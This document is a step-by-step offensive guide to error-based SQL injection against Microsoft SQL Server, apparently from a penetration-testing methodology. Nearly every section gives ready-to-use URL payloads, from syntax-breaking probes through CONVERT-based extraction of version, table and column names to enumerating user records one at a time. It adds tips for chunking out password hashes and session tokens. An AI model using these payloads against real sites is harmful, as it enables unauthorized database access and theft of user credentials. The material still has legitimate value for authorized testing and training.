# Error-Based Workflow

**Objective:** To abuse verbose database error handling by forcing the database to evaluate a subquery, fail a mathematical or formatting rule, and print the result of our subquery inside the resulting error message.

---

## Phase 1: Trigger & Identification
Your first goal is to determine if the application is suppressing errors (returning a generic "500 Server Error") or reflecting raw database errors to the screen.

**1. The Syntax Break:**
Inject characters designed to break string encapsulation.
* `?id=1'`
* `?id=1"`
* `?id=1\`

**2. Evaluate the Response:**
* *Generic Error (e.g., "Something went wrong"):* Error-Based extraction is not possible. Pivot to UNION or Blind SQLi.
* *Verbose Error (e.g., "Unclosed quotation mark after the character string"):* Proceed to Phase 2. The database is talking to you.

---

## Phase 2: Confirmation (The Execution Test)
Just because you see an error doesn't mean you can extract data. You must prove the database will actively execute a function *before* crashing. 

**The Goal:** Force a type-conversion or mathematical error using a known value.

**Example (Testing MSSQL):**
We ask the database to convert a word into an integer.
* **Payload:** `?id=1' AND 1=CONVERT(INT, 'test_string')--`
* **Success Criteria:** If the error message says: `Conversion failed when converting the varchar value 'test_string' to data type int`, you have confirmed execution. The database read your string and tried to process it.

---

##  Phase 3: Database Mapping (Information Gathering)
Now that execution is confirmed, replace the dummy string (`'test_string'`) with actual database queries. The database will attempt to convert the result of your query into an integer, fail, and print your data.

**1. Extract the Version:**
* **Payload:** `?id=1' AND 1=CONVERT(INT, (SELECT @@version))--`
* **Output:** `Conversion failed... value 'Microsoft SQL Server 2019...' to data type int.`

**2. Extract the First Table Name:**
* **Payload:** `?id=1' AND 1=CONVERT(INT, (SELECT TOP 1 table_name FROM information_schema.tables))--`
* **Output:** `Conversion failed... value 'users' to data type int.`

**3. Extract the First Column Name (from the 'users' table):**
* **Payload:** `?id=1' AND 1=CONVERT(INT, (SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--`
* **Output:** `Conversion failed... value 'username' to data type int.`

---

## Phase 4: Systematic Data Exfiltration
Once you have the blueprint, you extract the actual target data.

**1. Extract the First Record:**
* **Payload:** `?id=1' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users))--`
* **Output:** `Conversion failed... value 'admin' to data type int.`

**2. Bypassing the "TOP 1" Limitation:**
Because error messages can only print one piece of data at a time, you cannot dump an entire table at once. You must use `NOT IN` (or `OFFSET` in newer databases) to skip the rows you have already extracted.

* **Extracting the second user:** `?id=1' AND 1=CONVERT(INT, (SELECT TOP 1 username FROM users WHERE username NOT IN ('admin')))--`
* **Output:** `Conversion failed... value 'jane_doe' to data type int.`

*(You repeat this process, adding each found username to the `NOT IN` list, until the database throws a generic error, meaning you have reached the end of the table).*

---

## Limitations & Pro-Tips
1. **Truncation:** Error messages often have strict character limits (e.g., 256 characters). If you are trying to extract a massive session token or a hashed password, the error message might cut it off halfway.
    * *The Fix:* Use the `SUBSTRING()` function to extract the password in chunks (e.g., characters 1-50, then 51-100).
2. **XML Parsing (MySQL):** If targeting MySQL, `CONVERT` does not work the same way. You must use XML parsing functions like `EXTRACTVALUE()` or `UPDATEXML()` to force the error. (See the Cheat Sheets for exact syntax).
